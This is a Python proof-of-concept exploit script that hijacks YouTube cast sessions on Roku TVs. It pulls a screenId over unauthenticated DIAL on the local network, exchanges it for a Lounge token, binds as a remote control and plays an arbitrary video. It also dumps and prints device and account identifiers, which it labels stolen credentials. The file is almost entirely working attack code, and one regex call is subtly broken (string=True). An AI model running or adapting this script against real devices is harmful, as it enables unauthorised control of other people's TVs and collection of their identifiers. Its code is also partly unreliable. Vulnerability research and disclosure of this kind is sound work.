#!/usr/bin/env python3
"""
PoC: YouTube Cast Session Hijack via Unauthenticated DIAL Token Leak

YouTube on Roku TVs leaks a screenId via DIAL that can be exchanged
for a loungeToken — giving any device on the LAN full cast control.

Usage:
  python3 poc.py --ip <ROKU_IP> --hijack          # full 4-step hijack chain
  python3 poc.py --ip <ROKU_IP> --play <VIDEO_ID> # play a specific video

Tested: YouTube 2.23.150000193 on TCL 32S327, Roku OS 16.0.4 (Build 48H.04E00853A)
Author: NSM Barii
"""



# ETC IMPORTS
import sys, argparse, time, re, json, requests

# UI IMPORTS
from rich.console import Console


# CONSTANTS
console = Console()

CON_NAME = "NSM-PoC" 

DEFAULT_PORT = 8060

YOUTUBE_ORIGIN = "https://www.youtube.com"

LOUNGE_TOKEN_URL = "https://www.youtube.com/api/lounge/pairing/get_lounge_token_batch"
LOUNGE_BIND_URL  = "https://www.youtube.com/api/lounge/bc/bind"



class Lounge():
    """Cast session hijack via YouTube Lounge API — uses screenId leaked from DIAL"""


    creds = {}



    @classmethod
    def _get_youtube_account_Ids(cls, ip, port, naked=False):
        """This method will be used to snatch account Identifiers"""



        try:


            # EXAMPLE OUTPUT
            """
                <brand>REDACTED</brand>
                <model>REDACTED</model>
                <yumi>REDACTED_USER_TOKEN</yumi>
                <oisi>REDACTED_SESSION_ID</oisi>
                <oisiTimestamp>0000000000000</oisiTimestamp>
                <screenId>REDACTED_SCREEN_ID</screenId>
                <theme>cl</theme>
                <deviceId>00000000-0000-0000-0000-000000000000</deviceId>
                <passiveSessionId>00000000-0000-0000-0000-000000000000</passiveSessionId>

            """

            url = f"http://{ip}:{port}/dial/YouTube"

            response = requests.get(url=url, headers={"Origin": "https://www.youtube.com"}, timeout=5)

            if not response: console.print(f"[bold red][!] Failed to get YouTube account Identifiers - [yellow]url: {url}")

            text = response.text


            # NO NEED TO GRAB THIS AS WE ALREADY CAPTURE IT FROM SNAGGING A LOUNGE SESSION
            if naked: cls.creds["screen_id"] = re.search(string=text, pattern=r'<screenId>([^<]+)</screenId>').group(1)


            cls.creds["git"]   = re.search(string=True, pattern=r'<test>([^<]+)</test>').group(1)
            cls.creds["brand"] = re.search(string=text, pattern=r'<brand>([^<]+)</brand>').group(1)
            cls.creds["model"] = re.search(string=text, pattern=r'<model>([^<]+)</model>').group(1)
            cls.creds["yumi"]  = re.search(string=text, pattern=r'<yumi>([^<]+)</yumi>').group(1)
            cls.creds["oisi"]  = re.search(string=text, pattern=r'<oisi>([^<]+)</oisi>').group(1)
            cls.creds["theme"] = re.search(string=text, pattern=r'<theme>([^<]+)</theme>').group(1)
            cls.creds["device_id"] = re.search(string=text, pattern=r'<deviceId>([^<]+)</deviceId>').group(1)
            cls.creds["passive_session_id"] = re.search(string=text, pattern=r'<passiveSessionId>([^<]+)</passiveSessionId>').group(1)


            return True



        except Exception as e: console.print(f"[bold red][!] Error - Failed to query for dial protocol:[yellow] {e}"); return False          


    @classmethod
    def _get_screen_id(cls, ip, port):
        """Step 1 - This method will steal screenId from DIAL — tries YouTube, YouTube TV, then ECP launch"""

        try:

            # TRY YOUTUBE FIRST
            url = f"http://{ip}:{port}/dial/YouTube"
            response = requests.get(url=url, headers={"Origin": YOUTUBE_ORIGIN}, timeout=5)

            match = re.search(r'<screenId>([^<]+)</screenId>', response.text)
            if match:
                cls.creds["screenId"] = match.group(1)
                console.print(f"[bold green][+] screenId (YouTube):[yellow] {match.group(1)[:40]}...")
                return match.group(1)

            console.print(f"[bold red][!] No screenId from YouTube — trying YouTube TV...")

        except Exception as e: print(f"[bold red][!] Exception Error:[bold yellow] {e}")

        try:


            # YOUTUBE TV LEAKS SCREEN ID EVEN WHEN STOPPED // FOUND THIS OUT AFTER DOING ADDITIONAL RESEARCH ON A RCA ROKU TV AS WELL AS THE TCL ROKU TV
            url = f"http://{ip}:{port}/dial/YouTubeTV"
            response = requests.get(url=url, headers={"Origin": YOUTUBE_ORIGIN}, timeout=5)

            match = re.search(r'<screenId>([^<]+)</screenId>', response.text)

            if match:

                # GRAB THE REST OF THE IDENTIFIERS
                cls.creds["screenId"] = match.group(1)

                console.print(f"[bold green][+] screenId (YouTube TV — stopped):[yellow] {match.group(1)[:40]}...")
                return match.group(1)

        except Exception: pass

        try:


            # LAUNCH YOUTUBE VIA ECP AND QUERY FOR SCREEN ID FROM THERE
            console.print(f"[bold yellow][*] Launching YouTube via ECP and polling for screenId...")

            requests.post(f"http://{ip}:{port}/launch/837", timeout=5)

            start = time.time()
            wait = " - please wait as the screenId can take up to about 30 seconds to appear!"

            for i in range(30):
                time.sleep(2)
                response = requests.get(f"http://{ip}:{port}/dial/YouTube", headers={"Origin": YOUTUBE_ORIGIN}, timeout=5)
                
                match = re.search(r'<screenId>([^<]+)</screenId>', response.text)
               
                if match:
                    cls.creds["screenId"] = match.group(1)
                    console.print(f"[bold green][+] screenId (after launch, {(i+1)*2}s):[yellow] {match.group(1)[:40]}...")
                    return match.group(1)

                if i % 5 == 4:
                    console.print(f"[bold yellow]    still waiting... ({(i+1)*2}s){wait}"); wait = ""

            console.print(f"[bold red][!] screenId never appeared — user may need to select a profile")
            return False

        except Exception as e: print(f"[bold red][!] Exception Error:[yellow] {e}"); return False


    @classmethod
    def _get_lounge_token(cls, screen_id):
        """Step 2 - This method will exchange screenId for loungeToken — Google hands it over, no auth"""


        try:

            response = requests.post(url=LOUNGE_TOKEN_URL, data={"screen_ids": screen_id}, timeout=10)
            data = response.json()

            token = data["screens"][0]["loungeToken"]
            cls.creds["token"] = token

            console.print(f"[bold green][+] loungeToken:[yellow] {token[:40]}...")
            return token

        except Exception as e: print(f"[bold red][!] Exception Error:[yellow] {e}"); return None



    @classmethod
    def _bind(cls, lounge_token):
        """Step 3 - This method will bind as REMOTE_CONTROL — now we own the cast session"""


        try:

            params = {
                "device": "REMOTE_CONTROL",
                "id": f"{CON_NAME.lower()}",
                "name": f"{CON_NAME}",
                "loungeIdToken": lounge_token,
                "mdx-version": "3",
                "ui": "1",
                "v": "8",
                "app": "youtube-desktop",
                "VER": "8",
                "RID": "1",
                "CVER": "1",
                "zx": f"bind{int(time.time())}",
            }

            response = requests.post(url=LOUNGE_BIND_URL, params=params, timeout=10)

            sid_match      = re.search(r'"c","([^"]+)"', response.text)
            gsession_match = re.search(r'"S","([^"]+)"', response.text)

            if not sid_match or not gsession_match:
                console.print(f"[bold red][!] Bind failed — no SID/gsessionid in response")
                return False, False

            cls.creds["SID"] = sid_match.group(1)
            cls.creds["gsessionid"] = gsession_match.group(1)

            console.print(f"[bold green][+] Bound as REMOTE_CONTROL")
            console.print(f"[bold green][+] SID:[yellow] {sid_match.group(1)}")

            return sid_match.group(1), gsession_match.group(1)

        except Exception as e: print(f"[bold red][!] Exception Error:[yellow] {e}"); return False, False



    @classmethod
    def _send(cls, lounge_token, sid, gsessionid, command, extra_params=None):
        """Step 4 - This method will send a command to the hijacked cast session"""

        try:

            params = {
                "device": "REMOTE_CONTROL",
                "id": "nsm-poc",
                "name": "NSM-PoC",
                "loungeIdToken": lounge_token,
                "SID": sid,
                "gsessionid": gsessionid,
                "VER": "8",
                "RID": "2",
                "AID": "5",
                "zx": f"cmd{int(time.time())}",
            } 

            data = {"count": "1", "ofs": "0", "req0__sc": command}
            if extra_params: data.update(extra_params)

            response = requests.post(url=LOUNGE_BIND_URL, params=params, data=data, timeout=10)

            console.print(f"[bold green][+] {command}:[yellow] {response.status_code}")
            return response

        except Exception as e: print(f"[bold red][!] Exception Error:[yellow] {e}"); return False


    @classmethod
    def _hijack(cls, ip, port, video_id="dQw4w9WgXcQ"):
        """Full hijack chain — 4 steps, zero auth"""


        console.print(f"\n[bold green][*] Target:[yellow] {ip}:{port}\n[bold green][*] YouTube Cast Session Hijack\n")

    
        console.print(f"[bold cyan][Step 1] Extracting screenId from DIAL...")

        screen_id = cls._get_screen_id(ip=ip, port=port)
        if not screen_id: return False


        console.print(f"\n[bold cyan][Step 2] Exchanging screenId for loungeToken...")

        lounge_token = cls._get_lounge_token(screen_id=screen_id)
        if not lounge_token: return False



        console.print(f"\n[bold cyan][Step 3] Binding as REMOTE_CONTROL...")

        sid, gsessionid = cls._bind(lounge_token=lounge_token)
        if not sid: return False

        console.print(f"\n[bold green][+] Cast session hijacked — full control confirmed\n")



        console.print(f"[bold cyan][Step 4] Playing video:[yellow] {video_id}")

        cls._send(lounge_token=lounge_token, sid=sid, gsessionid=gsessionid, command="setPlaylist", extra_params={"req0_videoId": video_id}) 

        console.print(f"\n[bold green][+] Done — video is playing on the TV, zero auth required\n")


       

        if not Lounge._get_youtube_account_Ids(ip=ip, port=port, naked=False): return False 
        console.print(f"[bold cyan][*] Stolen credentials:")
        for k, v in cls.creds.items():
            console.print(f"[bold green]    {k}:[yellow] {v}")



    @classmethod
    def main(cls):
        """Entry point"""


        parser = argparse.ArgumentParser(
            description="PoC: YouTube cast session hijack via unauthenticated DIAL token leak",
            add_help=True)


        parser.add_argument("--ip", help="Target Roku IP Address")
        parser.add_argument("--port", default=DEFAULT_PORT, help="ECP port")
        parser.add_argument("--hijack", action="store_true", help="Full cast hijack chain (screenId -> loungeToken -> bind -> play)")
        parser.add_argument("--play", metavar="VIDEO_ID", help="Play a specific YouTube video on the TV")
        parser.add_argument("--dump", action="store_true", help="This will use a origin get request to dump Dial data")


        args = parser.parse_args()


        ip      = args.ip
        port    = args.port
        hijack  = args.hijack
        play    = args.play
        dump    = args.dump


        if not ip: console.print(f"[bold red][!] Roku IP needed and not given!"); sys.exit()

        if hijack: cls._hijack(ip=ip, port=port); sys.exit()

        if play: cls._hijack(ip=ip, port=port, video_id=play); sys.exit()

        if dump: cls._get_youtube_account_Ids(ip=ip, port=port, naked=True)

        parser.print_help()


if __name__ == "__main__":
    Lounge.main()
